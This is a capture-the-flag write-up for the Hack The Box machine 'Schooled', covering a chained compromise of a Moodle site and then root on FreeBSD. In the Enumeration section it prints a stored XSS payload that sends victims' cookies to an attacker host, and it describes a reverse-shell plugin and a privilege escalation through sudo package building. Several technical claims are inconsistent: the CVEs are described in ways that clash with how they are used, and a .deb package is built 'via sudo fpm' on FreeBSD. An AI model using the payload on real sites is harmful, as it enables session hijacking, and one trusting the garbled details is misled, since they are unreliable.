# Schooled

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | FreeBSD |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.234 |
| **Status** | Retired |

## Overview
Schooled is a Medium FreeBSD machine hosting a Moodle-based school website. Two chained Moodle vulnerabilities: **CVE-2020-25627** (privilege confusion allowing a student to gain teacher-level access) and **CVE-2020-14321** (an H5P content-type upload flaw): are combined to escalate from a student account to a manager-level account and finally install a malicious Moodle "block" plugin, achieving remote code execution. On the OS itself, a cracked password hash from the Moodle database allows SSH access, and root is obtained by abusing `sudo` permissions to build/install a malicious package with `fpm` combined with write access to `/etc/hosts`.

## Reconnaissance
Nmap showed SSH and an Apache/PHP web server on FreeBSD:

```
22/tcp open  ssh   OpenSSH 7.9 (FreeBSD 20200214)
80/tcp open  http  Apache httpd 2.4.46 (FreeBSD) PHP/7.4.15
| http-title: Schooled - A new kind of educational institute
```

## Enumeration
The main site referenced `schooled.htb` and an `admissions@schooled.htb` contact. Virtual-host/subdomain brute forcing uncovered `moodle.schooled.htb`. A student account was registered/obtained (`shorida:Lol123456!` at `student.schooled.htb`), and further enumeration of staff naming conventions (`firstname_lastname@staff.schooled.htb`) helped identify additional accounts such as `higgins_jane@staff.schooled.htb` and `phillips_manuel@staff.schooled.htb`.

A stored XSS payload placed in a MoodleNet profile field:

```html
<script>document.location='http://<attacker_ip>:8001/grab.cgi?'+document.cookie;</script>
```

captured a teacher's session cookie, effectively hijacking a teacher (`carter_lianne`) session: an application of **CVE-2020-25627**, which allows unintended privilege interactions between student/teacher/manager Moodle roles.

## Foothold
With teacher-level access obtained (and further credentials `carter_lianne:Supersecret1!` recovered), Moodle's H5P content-type upload feature was abused per **CVE-2020-14321** ([PoC reference](https://github.com/HoangKien1020/CVE-2020-14321)) to escalate to manager privileges and enable installing a malicious "block" plugin. A minimal malicious Moodle block, `block_rce` (source kept under `files/rce/`, consisting of `version.php` and `lang/en/block_rce.php`), was packaged and installed through the Moodle plugin manager. The plugin's language-string file was used as an execution point to run a reverse-shell command, giving a shell as the web server user.

## Privilege Escalation
Moodle's configuration (`config.php`) exposed the MySQL credentials:

```php
$CFG->dbuser = 'moodle';
$CFG->dbpass = 'PlaybookMaster2020';
```

Querying the `mdl_user` table recovered a bcrypt password hash for the `jamie` account. Cracking it offline recovered the plaintext `jamie:!QAZ2wsx`, which was valid for SSH login. As `jamie`, `sudo -l` revealed permission to run `fpm` (Effing Package Management), a Ruby gem used to build OS packages, as root. Because `fpm` can be pointed at arbitrary source files and post-install scripts, and the user also had write access to `/etc/hosts`, a malicious `.deb`/package was built (using the upstream [fpm](https://github.com/jordansissel/fpm) tool: its source is not stored in this repository) embedding a payload that executed as root during package "installation" via `sudo fpm ...`, yielding a root shell.

## Lessons Learned
- Chaining multiple, individually "medium severity" CMS vulnerabilities (Moodle role confusion + H5P upload RCE) can escalate a low-privilege account all the way to code execution.
- Session-stealing via stored XSS remains highly effective against internal/admin-facing web panels.
- Granting `sudo` rights over generic packaging/build tools (`fpm`, `dpkg`, etc.) is equivalent to full root access, since these tools can execute arbitrary pre/post-install scripts.

## Tools & References
- Burp Suite / XSS cookie grabber, Hashcat (bcrypt cracking), custom Moodle `block_rce` plugin (`files/rce/`)
- **CVE-2020-25627**: Moodle role/privilege confusion
- **CVE-2020-14321**: Moodle H5P library RCE: [github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321)
- Upstream [`fpm`](https://github.com/jordansissel/fpm) packaging tool (used for the sudo privesc)
- Omitted from repository for hygiene:
  - `privesc/fpm/`: a full clone of the upstream `fpm` Ruby gem source tree (including `.git` history and pack files); the tool is publicly available at the link above and was used unmodified.
  - `rce.zip`: a zip archive duplicating the contents already preserved as plain source under `files/rce/`.
  - `H5P/greeting.h5p` and `H5P/greeting/test.h5p`: packaged H5P content archives (zip-format containers, one embedding a "rickroll" image) used as the CVE-2020-14321 PoC payload; the underlying `content.json`/`h5p.json` structure is described above.
  - `mysql/*.pem`: TLS certificates for the Moodle MySQL connection; not private keys, but not relevant to the attack narrative.
  - `hash`: a short crackable hash value (`tds2u76asjcurs3h9s13u5pv2k`) used during the engagement; already reproduced inline above where relevant.
  - `moodle.xml`: a small Moodle version/plugin metadata file used to pin down the exact Moodle build for CVE matching; superseded by the CVE references above.
